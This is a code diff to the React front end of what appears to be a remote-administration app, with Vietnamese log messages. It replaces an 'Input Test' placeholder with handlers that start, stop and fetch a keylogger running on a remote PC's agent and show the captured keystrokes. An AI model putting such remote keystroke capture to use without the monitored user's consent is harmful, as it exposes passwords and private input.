@@ -37,7 +37,7 @@ function App() {
   const [keyloggerOpen, setKeyloggerOpen] = useState(false);
   const [keyloggerRunning, setKeyloggerRunning] = useState(false);
   const [keyloggerContent, setKeyloggerContent] = useState('');
-  const keyloggerBusy = false;
+  const [keyloggerBusy, setKeyloggerBusy] = useState(false);
   const [webcamOpen, setWebcamOpen] = useState(false);
   const webcamBusy = false;
   const [mouseControlOpen, setMouseControlOpen] = useState(false);
@@ -98,8 +98,28 @@ function App() {
   const resolvePc = useCallback((pc: RemotePc) => pcs.find((p) => p.id === pc.id) ?? pc, [pcs]);
 
   const refreshKeyloggerLog = useCallback(async () => {
-        // Input Test chạy cục bộ, không cần gọi agent.
-    }, []);
+    if (!selectedPc) return;
+    try {
+      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_GET_LOG');
+      const parsed = JSON.parse(result.raw) as {
+        ok?: boolean;
+        output?: string;
+        running?: boolean;
+        message?: string;
+      };
+      if (typeof parsed.output === 'string') {
+        setKeyloggerContent(parsed.output);
+      }
+      if (typeof parsed.running === 'boolean') {
+        setKeyloggerRunning(parsed.running);
+      }
+      if (parsed.ok === false && parsed.message) {
+        appendLog(`KEYLOGGER_GET_LOG: ${parsed.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_GET_LOG: không đọc được phản hồi agent');
+    }
+  }, [selectedPc, appendLog]);
 
   useEffect(() => {
     if (!keyloggerOpen) return;
@@ -234,16 +254,52 @@ function App() {
     await refreshKeyloggerLog();
   };
 
-    const handleStartKeylogger = async () => {
+  const handleStartKeylogger = async () => {
+    if (!selectedPc) return;
+    setKeyloggerBusy(true);
+    try {
+      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_START');
+      const parsed = JSON.parse(result.raw) as { ok?: boolean; message?: string };
+      if (parsed.ok) {
         setKeyloggerRunning(true);
         setKeyloggerContent('');
-        appendLog('Input Test started.');
-    };
+        appendLog(`KEYLOGGER_START: ${parsed.message ?? 'ok'}`);
+        await refreshKeyloggerLog();
+      } else {
+        appendLog(`KEYLOGGER_START failed: ${parsed.message ?? result.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_START: lỗi phân tích phản hồi');
+    } finally {
+      setKeyloggerBusy(false);
+    }
+  };
 
-    const handleStopKeylogger = async () => {
+  const handleStopKeylogger = async () => {
+    if (!selectedPc) return;
+    setKeyloggerBusy(true);
+    try {
+      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
+      const parsed = JSON.parse(result.raw) as {
+        ok?: boolean;
+        output?: string;
+        message?: string;
+      };
+      if (parsed.ok && typeof parsed.output === 'string') {
+        setKeyloggerContent(parsed.output);
         setKeyloggerRunning(false);
-        appendLog('Input Test stopped.');
-    };
+        appendLog(`KEYLOGGER_STOP: đã nhận log (${parsed.output.length} ký tự)`);
+      } else {
+        setKeyloggerRunning(false);
+        appendLog(`KEYLOGGER_STOP: ${parsed.message ?? result.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_STOP: lỗi phân tích phản hồi');
+      setKeyloggerRunning(false);
+    } finally {
+      setKeyloggerBusy(false);
+    }
+  };
 
   const refreshProcessModal = async (target: RemotePc): Promise<CommandResult> => {
     const t = resolvePc(target);
@@ -485,7 +541,7 @@ function App() {
               content={keyloggerContent}
               onClear={() => {
                   setKeyloggerContent('');
-                  appendLog('Input Test cleared.');
+                  appendLog('Đã xóa nội dung hiển thị (log trên agent không đổi).');
               }}
               onClose={() => setKeyloggerOpen(false)}
               onRefresh={() => void refreshKeyloggerLog()}
